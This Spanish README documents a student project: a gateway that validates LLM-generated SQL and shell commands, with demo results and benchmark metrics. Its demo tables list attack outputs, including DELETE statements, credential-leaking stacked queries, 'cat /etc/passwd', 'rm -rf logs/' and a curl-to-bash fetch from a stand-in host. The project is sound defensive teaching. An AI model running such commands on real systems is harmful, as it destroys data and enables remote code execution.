# MVP — Mini Security Gateway de Salida para LLMs (SQL Injection y Command Injection)

> **Enfoque del proyecto:** Construimos un **mini security gateway de salida**: intercepta lo que
> genera el LLM, lo valida contra una allow-list y lo ejecuta con mínimo privilegio. Es el núcleo de
> lo que sería un Security Gateway completo para LLMs.

| | |
|---|---|
| Curso | Fundamentos de Seguridad de la Información — Seminario |
| Riesgo estudiado | OWASP Top 10 for LLM Applications 2025 — **LLM05: Improper Output Handling** |
| Caso real de referencia | **CVE-2024-5565** (Vanna.AI): el SQL/código generado por el LLM se ejecutaba sin validar |
| Vectores | **1. SQL Injection** · **2. Command Injection** |
| Estado | Funcional y probado de punta a punta el 2026-10-22; medido con `Benchmark.java` el 2026-10-23: 0 % de ataques exitosos con gateway, 4,8 % de falsos positivos (§8) |

---

## 1. Problema

Una aplicación le pide al LLM que traduzca lenguaje natural a **SQL** o a un **comando de shell** y
ejecuta lo que el LLM devuelve. Si la petición es maliciosa ("Quiero borrar todas las ventas") o el
modelo se equivoca, el LLM genera una salida peligrosa (`DELETE FROM ventas;`) y la aplicación la
ejecuta con sus propios privilegios.

**Idea central del MVP:** la salida del LLM es entrada no confiable. Hay que **validar lo que genera
el LLM antes de ejecutarlo** y ejecutarlo con **mínimo privilegio**.

## 2. Alcance

El MVP muestra cada vector en dos versiones lado a lado:

| | Vector 1: SQL | Vector 2: Command |
|---|---|---|
| **Insegura** | Ejecuta todas las sentencias que genera el LLM, sin validar | Pasa el texto del LLM a un shell (`bash -c` / `powershell -Command`) |
| **Segura (el gateway)** | `SqlValidator` + conexión SQLite de solo lectura | `CommandValidator` + ejecución **sin shell** |

## 3. Arquitectura del mini security gateway (lo implementado)

```
 Usuario (navegador · index.html)
        │  pregunta en lenguaje natural
        ▼
 ┌──────────────── APP JAVA · JDK HttpServer :8000 (App.java) ────────────────┐
 │   /insecure-sql   /secure-sql   /insecure-cmd   /secure-cmd   /reset-db     │
 └───────────────────────────────┬────────────────────────────────────────────┘
                                 ▼
              LLM (LlmClient.java)
              · API de Anthropic si hay ANTHROPIC_API_KEY
              · simulador local por palabras clave si no hay clave
                                 │
                                 │  SALIDA DEL LLM: SQL o comando   ◄── punto de riesgo (LLM05)
                                 ▼
        ┌── /insecure-* ─────────┴───────── /secure-* ──┐
        │                                                │
        ▼                                                ▼
  Ejecución directa              ┌─ OUTPUT SECURITY LAYER ─────────────────────┐
  · SQL: todas las sentencias    │  SqlValidator                                │
  · CMD: shell (bash/powershell) │   · una sola sentencia, solo SELECT          │
        │                        │   · palabras prohibidas (drop, delete, ...)  │
        │                        │   · allow-list de tablas: clientes, ventas   │
        │                        │  CommandValidator                            │
        │                        │   · rechaza metacaracteres ; && & || | ` $( <│
        │                        │   · allow-list de verbos: ls pwd date whoami │
        │                        │   · allow-list de argumentos (solo ls -la..) │
        │                        └──────────────┬───────────────────────────────┘
        │                          BLOQUEADO ◄──┤ válido
        │                                       ▼
        │                        ┌─ EJECUCIÓN CON MÍNIMO PRIVILEGIO ────────────┐
        │                        │  SQL: SQLite en modo solo lectura (mode=ro)  │
        │                        │  CMD: ProcessBuilder con tokens, SIN shell   │
        │                        └──────────────┬───────────────────────────────┘
        ▼                                       ▼
 ┌──────────────────────── Respuesta JSON al navegador ────────────────────────┐
 │   { "generado": <salida del LLM>, "resultado": <efecto o BLOQUEADO: motivo> } │
 └─────────────────────────────────────────────────────────────────────────────┘
```

El gateway actúa sobre la **salida** del LLM: no importa cómo se obtuvo esa salida, si no pasa la
validación no se ejecuta.

## 4. Componentes

| Archivo | Responsabilidad |
|---|---|
| `src/main/java/com/fdsi/mvp/App.java` | Servidor HTTP, endpoints, ejecución insegura y segura, restauración de la BD |
| `src/main/java/com/fdsi/mvp/LlmClient.java` | Llamada a la API de Anthropic o simulador local sin costo |
| `src/main/java/com/fdsi/mvp/SqlValidator.java` | Validación estructurada del SQL generado |
| `src/main/java/com/fdsi/mvp/CommandValidator.java` | Allow-list de comandos y argumentos, rechazo de metacaracteres |
| `src/main/java/com/fdsi/mvp/DbInit.java` | Crea `ventas.db`: 10 clientes, 30 ventas y la tabla ficticia `secretos_demo` |
| `src/main/java/com/fdsi/mvp/Benchmark.java` | Medición automática: 58 casos etiquetados, métricas de eficacia, usabilidad y rendimiento (§7 y §8) |
| `src/main/resources/static/index.html` | Interfaz con ejemplos (legítimos y ataques) y botón "Restaurar base de datos" |

Stack: Java 17+ (probado con 23), Maven, SQLite (`org.xerial:sqlite-jdbc` 3.46.1.0), sin frameworks.

### Datos de prueba (`ventas.db`)

| Tabla | Contenido |
|---|---|
| `clientes` | 10 clientes ficticios de 7 ciudades de Colombia |
| `ventas` | 30 ventas (agosto–septiembre 2026): laptops, celulares, monitores, tablets, periféricos |
| `secretos_demo` | 2 credenciales **ficticias** (`API_KEY_DEMO`, `DB_PASSWORD_DEMO`): el objetivo de los ataques de fuga |

## 5. Controles implementados

### 5.1 Vector SQL — `SqlValidator` + solo lectura

| Control | Qué detiene |
|---|---|
| Rechaza `;` intermedio (una sola sentencia) | Encadenar `SELECT ...; SELECT * FROM secretos_demo` |
| Solo permite consultas que empiezan por `SELECT` | `DELETE`, `DROP`, `UPDATE`, `INSERT` |
| Palabras prohibidas: `drop delete update insert alter attach detach pragma replace vacuum load_extension` | Escritura, cambios de esquema o carga de extensiones escondidos en la consulta |
| Rechaza cualquier mención a `secretos_demo` | Fuga de la tabla sensible |
| Allow-list de tablas: revisa **todas** las tablas de `FROM`/`JOIN`, listas con comas, subconsultas y nombres entre comillas | Lectura de otras tablas (`sqlite_master`, etc.) |
| Conexión SQLite en modo solo lectura | Segunda barrera: aunque algo pase el validador, no puede escribir |

### 5.2 Vector Command — `CommandValidator` + sin shell

| Control | Qué detiene |
|---|---|
| Rechaza `;` `&&` `&` `\|\|` `\|` `` ` `` `$(` `>` `<` salto de línea | Encadenar comandos, tuberías, segundo plano, sustitución, redirección |
| Allow-list cerrada de verbos: `ls`, `pwd`, `date`, `whoami` | `cat`, `rm`, `curl`, `bash`, etc. |
| Allow-list de argumentos: solo opciones de `ls` (`-l`, `-a`, `-la`...), ninguna ruta | Listar directorios del sistema (`ls -la /etc`) o formatos raros (`date +%s`) |
| `ProcessBuilder` recibe la lista de tokens, **sin** intérprete de shell | Segunda barrera: un metacarácter que se escape no se interpreta |

Se usa **allow-list** (se permite solo lo conocido) y no deny-list (bloquear lo peligroso), porque
una deny-list se elude con variantes.

## 6. Casos de la demo (resultados verificados)

Resultados obtenidos el 2026-10-22 con el servidor corriendo en **modo simulación** (sin API key).
Con un LLM real la salida generada puede variar; los validadores actúan igual.

### 6.1 SQL

| Botón | El LLM genera | Insegura | Segura |
|---|---|---|---|
| 🟢 Consulta legítima | `SELECT cliente_id, SUM(monto) FROM ventas GROUP BY cliente_id` | Totales de los 10 clientes | Los mismos totales |
| 🔴 Ataque 1: DELETE | `DELETE FROM ventas;` | Borra las 30 ventas ("Filas afectadas: 30") | `BLOQUEADO: solo se permiten consultas SELECT` |
| 🔴 Ataque 2: fuga | `SELECT * FROM secretos_demo;` | Muestra las 2 credenciales ficticias | `BLOQUEADO: tabla no autorizada` |
| 🔴 Ataque 3: múltiples sentencias | `SELECT * FROM ventas; SELECT * FROM secretos_demo;` | Ejecuta ambas: lista las ventas **y** filtra las credenciales | `BLOQUEADO: múltiples sentencias no están permitidas` |

Después del Ataque 1 se pulsa **"♻️ Restaurar base de datos"** para recuperar los datos.

### 6.2 Command

| Botón | El LLM genera | Insegura | Segura |
|---|---|---|---|
| 🟢 Comando legítimo | `date` | Fecha y hora del shell real | Fecha y hora (sin shell) |
| 🔴 Ataque 1: concatenación | `ls; whoami; cat /etc/passwd` | Fuga de `/etc/passwd` (simulada) | `BLOQUEADO: metacaracter de shell (;)` |
| 🔴 Ataque 2: destructivo | `ls && rm -rf logs/` | Borrado de logs (simulado) | `BLOQUEADO: metacaracter de shell (&&)` |
| 🔴 Ataque 3: reverse shell | `curl -s http://malicioso.com/exploit.sh \| bash` | RCE / reverse shell (simulada) | `BLOQUEADO: metacaracter de shell (\|)` |

### 6.3 Intentos de evasión del validador (probados)

| Salida del LLM | Resultado en la versión segura |
|---|---|
| `SELECT name, sql FROM clientes, sqlite_master` | BLOQUEADO: tabla fuera de la allow-list (`sqlite_master`) |
| `SELECT * FROM (SELECT * FROM sqlite_master)` | BLOQUEADO: tabla fuera de la allow-list |
| `SELECT * FROM "sqlite_master"` | BLOQUEADO: tabla fuera de la allow-list |
| `SELECT load_extension('x')` | BLOQUEADO: palabra clave no permitida |
| `ls -la /etc` | BLOQUEADO: argumento no permitido |
| `whoami & calc` | BLOQUEADO: metacaracter de shell (`&`) |
| `SELECT c.nombre, SUM(v.monto) FROM clientes c JOIN ventas v ON ...` | PASA (consulta legítima con JOIN y alias) |
| `SELECT * FROM ventas WHERE monto > (SELECT AVG(monto) FROM ventas)` | PASA (subconsulta sobre tabla permitida) |

### 6.4 Simulaciones declaradas

En la versión insegura de comandos, los ataques (`/etc/passwd`, `rm`/`logs`, `curl`/`bash`)
devuelven una respuesta **simulada** que describe el efecto real, para no destruir nada ni abrir
conexiones durante la demo. Solo se ejecutan de verdad en el shell `date`, `whoami`, `pwd`, `ls` y
`ls -la`; cualquier otro comando se muestra como "se habría ejecutado en el shell del servidor". Así
la demo es segura incluso con un LLM real. La vulnerabilidad es la misma: el texto del LLM llega sin
validar al intérprete.

Los ataques SQL **sí se ejecutan de verdad** sobre `ventas.db`, que es desechable y se restaura con
el botón o con `DbInit`.

## 7. Métricas: cómo medimos qué tan seguro es

Contar ataques bloqueados no basta: un gateway que bloquea todo es "seguro" pero inútil. Por eso se
mide en tres familias. Todas se calculan con `Benchmark.java` sobre un conjunto etiquetado de
salidas del LLM, cada una marcada como **legítima** o **ataque**.

**Definiciones base (matriz de confusión).** Positivo = el gateway bloquea.

| | El gateway bloquea | El gateway permite |
|---|---|---|
| **Es un ataque** | VP (verdadero positivo) | FN (falso negativo: ataque que se cuela) |
| **Es legítima** | FP (falso positivo: uso normal bloqueado) | VN (verdadero negativo) |

### 7.1 Eficacia de seguridad

| Métrica | Fórmula | Qué responde | Meta |
|---|---|---|---|
| Tasa de éxito de ataques (ASR) sin gateway | ataques con efecto ÷ ataques | ¿Qué tan expuesta está la app sin protección? | Línea base |
| Tasa de éxito de ataques (ASR) con gateway | ataques que pasan ÷ ataques | ¿Cuántos ataques siguen funcionando? | 0 % en el conjunto de prueba |
| Tasa de bloqueo (recall o sensibilidad) | VP ÷ (VP + FN) | ¿Qué fracción de ataques detecta? | ≥ 95 % |
| Bloqueo por categoría | VP ÷ ataques de la categoría | ¿Hay algún tipo de ataque débilmente cubierto? | 100 % por categoría |

### 7.2 Precisión y usabilidad

| Métrica | Fórmula | Qué responde | Meta |
|---|---|---|---|
| Tasa de falsos positivos (FPR) | FP ÷ (FP + VN) | ¿Cuánto uso legítimo rompe la seguridad? | ≤ 5 % |
| Tasa de éxito de peticiones legítimas | legítimas que pasan **y** se ejecutan bien ÷ legítimas | ¿Los usuarios siguen pudiendo trabajar? | ≥ 95 % |
| Precisión | VP ÷ (VP + FP) | Cuando bloquea, ¿acierta? | ≥ 0,95 |
| F1 | 2 · precisión · recall ÷ (precisión + recall) | Equilibrio entre seguridad y usabilidad | ≥ 0,95 |
| Exactitud | (VP + VN) ÷ total | Decisiones correctas en general | ≥ 0,95 |

### 7.3 Rendimiento

| Métrica | Cómo se mide | Qué responde | Meta |
|---|---|---|---|
| Latencia promedio del validador | `System.nanoTime()` en 500 rondas sobre todos los casos, tras calentar la JVM | ¿Cuánto tiempo agrega el gateway a cada petición? | < 1 ms |
| Latencia p95 del validador | Percentil 95 de las mismas mediciones | ¿El peor caso habitual sigue siendo rápido? | < 1 ms |

La meta de rendimiento es holgada a propósito: una llamada a un LLM tarda del orden de cientos de
milisegundos o más, así que un validador de microsegundos no es perceptible para el usuario.

**Cómo correr la medición** (no necesita el servidor y nunca toca `ventas.db`, porque trabaja sobre
una copia temporal):

```powershell
mvn compile exec:java "-Dexec.mainClass=com.fdsi.mvp.Benchmark"
```

## 8. Estadísticas después de la solución

Resultados de `Benchmark.java` del 2026-10-23 (Windows 11, Java 23). Las cifras de seguridad son
deterministas; las de latencia variaron menos de 0,3 µs entre tres corridas.

**Conjunto de prueba:** 58 salidas del LLM: 37 ataques (19 SQL, 18 comandos) y 21 legítimas
(13 SQL, 8 comandos). Los ataques son estructurales e inofensivos: borrados sobre una copia
temporal, lectura de tablas no autorizadas, encadenamiento de comandos de solo lectura.

### 8.1 Antes y después

| Indicador | Sin gateway | Con gateway |
|---|---|---|
| Tasa de éxito de ataques | **97,3 %** (36 de 37) | **0 %** (0 de 37) |
| Peticiones legítimas que funcionan | 100 % (21 de 21) | **95,2 %** (20 de 21) |
| Tiempo agregado por petición | 0 | **≈ 3 µs** promedio en SQL y **< 1 µs** en comandos |

El único ataque sin efecto incluso sin gateway es `SELECT load_extension('x')`: lo frena la
configuración por defecto de SQLite, no la aplicación. Los comandos sin gateway se cuentan como
exitosos porque llegan al shell sin ningún control; el benchmark no los ejecuta.

### 8.2 Eficacia por categoría

| Vector | Categoría | Casos | Bloqueados |
|---|---|---|---|
| SQL | Destrucción (`DELETE`, `DROP`, `UPDATE`, `INSERT`, `ALTER`) | 5 | 100 % |
| SQL | Fuga de datos (`secretos_demo`, `sqlite_master`) | 3 | 100 % |
| SQL | Múltiples sentencias | 3 | 100 % |
| SQL | Evasión (comas, subconsultas, comillas, mayúsculas mezcladas) | 5 | 100 % |
| SQL | Funciones peligrosas (`load_extension`, `PRAGMA`, `ATTACH`) | 3 | 100 % |
| CMD | Concatenación (`;` `&&` `\|\|` `&` salto de línea) | 5 | 100 % |
| CMD | Tubería (`\|`) | 1 | 100 % |
| CMD | Sustitución (`` ` `` y `$( )`) | 2 | 100 % |
| CMD | Redirección (`>` `<`) | 2 | 100 % |
| CMD | Verbo fuera de la allow-list | 4 | 100 % |
| CMD | Argumentos no permitidos | 4 | 100 % |

### 8.3 Precisión y usabilidad

| VP | FP | FN | VN | Precisión | Recall | F1 | Exactitud | Falsos positivos |
|---|---|---|---|---|---|---|---|---|
| 37 | 1 | 0 | 20 | 0,974 | 1,000 | 0,987 | 0,983 | 4,8 % |

**El falso positivo:** una consulta legítima con `WITH` (expresión de tabla común) se bloquea porque
el validador exige que la consulta empiece por `SELECT`. Es el precio de la allow-list estricta: se
prefiere bloquear una consulta válida poco común antes que dejar pasar una forma no revisada. Si los
usuarios la necesitaran, se agrega como forma permitida y se vuelve a medir.

### 8.4 Rendimiento

| Validador | Promedio | p95 |
|---|---|---|
| `SqlValidator` | 2,6 – 2,8 µs | 8,2 – 8,4 µs |
| `CommandValidator` | 0,7 – 0,8 µs | 1,5 – 1,7 µs |

Todas las metas de §7 se cumplen: ASR con gateway 0 %, recall 100 %, falsos positivos 4,8 % (meta
≤ 5 %), legítimas que funcionan 95,2 % (meta ≥ 95 %), F1 0,987 y latencia en microsegundos.

### 8.5 Cómo leer estas cifras

- **El 100 % es sobre nuestro conjunto de prueba, no sobre cualquier ataque posible.** Los casos los
  escribimos conociendo las reglas, así que un atacante real podría encontrar formas que no probamos.
  Por eso el gateway tiene una segunda barrera (solo lectura y sin shell) que limita el daño de lo
  que se escape.
- Con un LLM real la salida generada varía; el benchmark mide al gateway con salidas fijas para que
  la medición sea repetible.
- `COSTOS.md` asume una reducción de riesgo del **85 %**, por debajo del 100 % medido: es una
  suposición conservadora coherente con el punto anterior.

## 9. Cómo afecta a otros sistemas de la organización

Se usa la empresa ficticia **TecnoVentas S.A.S.** de `COSTOS.md` (comercializadora de tecnología,
45 empleados, siete ciudades). Su asistente con LLM consulta la base de datos de ventas y su equipo
de TI usa un asistente que traduce peticiones a comandos del servidor. Los sistemas de abajo son
**supuestos típicos** de una empresa de ese tamaño.

### 9.1 Por qué el daño no se queda en la base de datos

```
 Salida del LLM sin validar
        │
        ├─► SQL ──► Base de datos de ventas y clientes
        │              ├─ borra o altera ventas ───────► ERP / inventario · Facturación electrónica · Contabilidad
        │              └─ filtra clientes y credenciales ► CRM · Correo · Tienda en línea · otros sistemas
        │                                                  (las credenciales robadas abren puertas)
        │
        └─► Comando ──► Servidor de la aplicación
                       └─ control del servidor ─────────► red interna · copias de seguridad · otros servidores
```

La aplicación con LLM suele tener **más permisos de los que necesita** y comparte red, cuentas o
datos con otros sistemas. Por eso una sola salida maliciosa puede propagarse: lo que empieza como una
consulta borrada termina en facturas sin soporte o en credenciales usadas en otro sistema.

### 9.2 Impacto por sistema

| Sistema de TecnoVentas | Cómo se afecta sin gateway | Pilar afectado | Cómo lo frena el gateway |
|---|---|---|---|
| **Base de datos de ventas y clientes** | Borrado o alteración de ventas; lectura de datos personales y de la tabla de credenciales | Integridad, disponibilidad, confidencialidad | Solo `SELECT` sobre `clientes` y `ventas`, conexión de solo lectura |
| **ERP e inventario** | Si comparte la base de datos o se alimenta de ella, el stock y los pedidos quedan desactualizados o en cero | Integridad, disponibilidad | Nada se puede escribir ni borrar desde el asistente |
| **Facturación electrónica (DIAN)** | Ventas borradas o alteradas dejan facturas sin soporte y descuadres con lo reportado | Integridad; riesgo legal y tributario | Las ventas no se pueden modificar desde el asistente |
| **Contabilidad** | Cierres e informes calculados con datos alterados | Integridad | Igual que el anterior |
| **CRM y marketing** | Los datos de clientes filtrados permiten fraudes o correos falsos dirigidos a ellos; incumplimiento de la Ley 1581 | Confidencialidad; riesgo legal y reputacional | Las tablas sensibles no se pueden consultar |
| **Correo, directorio de usuarios y otros sistemas** | Las credenciales filtradas (en el MVP, `secretos_demo`) sirven para entrar a otros sistemas, sobre todo si se reutilizan | Confidencialidad, integridad | La tabla de credenciales queda fuera de la allow-list |
| **Servidor de la aplicación** | Un comando encadenado da control del servidor con los permisos de la aplicación | Confidencialidad, integridad, disponibilidad | Solo 4 comandos de lectura, sin argumentos peligrosos y sin shell |
| **Red interna y otros servidores** | Desde el servidor comprometido se puede intentar llegar a otros equipos | Los tres pilares | No hay forma de ejecutar comandos arbitrarios, así que no hay punto de partida |
| **Copias de seguridad** | Si están en el mismo servidor o red, se pueden borrar o cifrar junto con los datos (ransomware) | Disponibilidad | Igual que el anterior |
| **Tienda en línea y pasarela de pagos** | Si comparten servidor o base de datos, se exponen a los mismos daños; una caída detiene las ventas | Disponibilidad, integridad | Contiene el incidente en el asistente |

### 9.3 Impacto en el negocio

| Área | Efecto sin gateway |
|---|---|
| Operación | Ventas y despachos detenidos mientras se recupera la información (en `COSTOS.md`, 2 días ≈ 50 M COP) |
| Legal | Sanciones de la SIC por datos personales (Ley 1581 de 2012) y problemas con la facturación electrónica |
| Reputación | Pérdida de confianza de los clientes cuyos datos se filtraron |
| Financiero | Pérdida anual esperada de **120 M COP** sin gateway frente a 18 M COP con gateway (`COSTOS.md`, §5 y §6) |

### 9.4 Lo que el gateway no cubre

El gateway reduce el radio de daño del asistente, pero la organización necesita controles
complementarios que están **fuera de este MVP**: credenciales distintas para cada sistema (que una
filtración no abra todo), segmentación de la red, copias de seguridad fuera de línea y monitoreo.

## 10. Cómo ejecutar

Requisitos: JDK 17+ y Maven 3.8+. En PowerShell, desde la carpeta del proyecto:

```powershell
cd "D:\Archivos universidad\Fundamentos de seguridad de la informacion\mvp_seminario_fdsi_java\Salidas-inseguras-con-LLM-"

# Modo simulación (sin costo): asegura que no haya clave en esta terminal
Remove-Item Env:ANTHROPIC_API_KEY -ErrorAction SilentlyContinue

# 1. Crear / reiniciar la base de datos de prueba
mvn compile exec:java "-Dexec.mainClass=com.fdsi.mvp.DbInit"

# 2. Levantar el servidor
mvn compile exec:java
```

Abrir **http://localhost:8000**. La consola indica si se usa el simulador o la API real. Detener
con `Ctrl+C`.

- Para restaurar los datos durante la demo: botón **"♻️ Restaurar base de datos"** (o repetir el paso 1).
- En PowerShell, el argumento `-D...` va entre comillas completo, como arriba.
- Para usar un LLM real: definir `ANTHROPIC_API_KEY` (y opcionalmente `MODEL_NAME`) en la terminal
  o en un `.env`. Nunca escribir la clave en el código.

Alternativa con jar:

```powershell
mvn package
java -cp target/mvp-llm-output-handling-1.0.0-jar-with-dependencies.jar com.fdsi.mvp.DbInit
java -jar target/mvp-llm-output-handling-1.0.0-jar-with-dependencies.jar
```


### Limitaciones conocidas

- Los validadores usan reglas y expresiones regulares, no un analizador SQL completo. Por eso existe
  la segunda barrera (solo lectura / sin shell): si algo se escapa, no puede escribir ni encadenar.
- En Windows, `ls -la` en la versión insegura muestra un error de PowerShell (su `ls` no acepta
  `-la`). No afecta a los ejemplos de la demo.
- Con un LLM real, la salida generada puede variar respecto a la tabla de §6.
- No hay registro de auditoría ni contadores en producción (fuera de alcance). La medición se hace con `Benchmark.java` (§7 y §8).

## 11. Fuera de alcance

- **Security Gateway completo** (proxy independiente entre cualquier aplicación y el proveedor del
  LLM): trabajo futuro. Este MVP es su capa de salida, embebida en la aplicación.
- Registro de auditoría y métricas en tiempo real en producción.
- Otros tipos de salida insegura (XSS, código, texto fuera de tema).

## 12. Referencias

- OWASP Top 10 for LLM Applications 2025 — LLM05: Improper Output Handling.
- CVE-2024-5565 — Vanna.AI, ejecución de código a partir de la salida del LLM.
- OWASP — SQL Injection Prevention Cheat Sheet; OS Command Injection Defense Cheat Sheet.
